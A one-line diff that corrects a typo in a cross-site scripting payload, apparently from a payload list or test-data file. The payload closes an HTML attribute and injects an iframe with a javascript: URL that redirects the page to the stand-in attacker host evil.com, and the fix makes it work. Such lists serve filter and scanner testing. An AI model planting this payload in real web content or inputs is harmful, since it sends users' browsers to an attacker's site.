@@ -1,1 +1,1 @@
-"><IFRAME SRC="javascript:javascript:window.location.replcae('http://evil.com');"></IFRAME>
+"><IFRAME SRC="javascript:javascript:window.location.replace('http://evil.com');"></IFRAME>
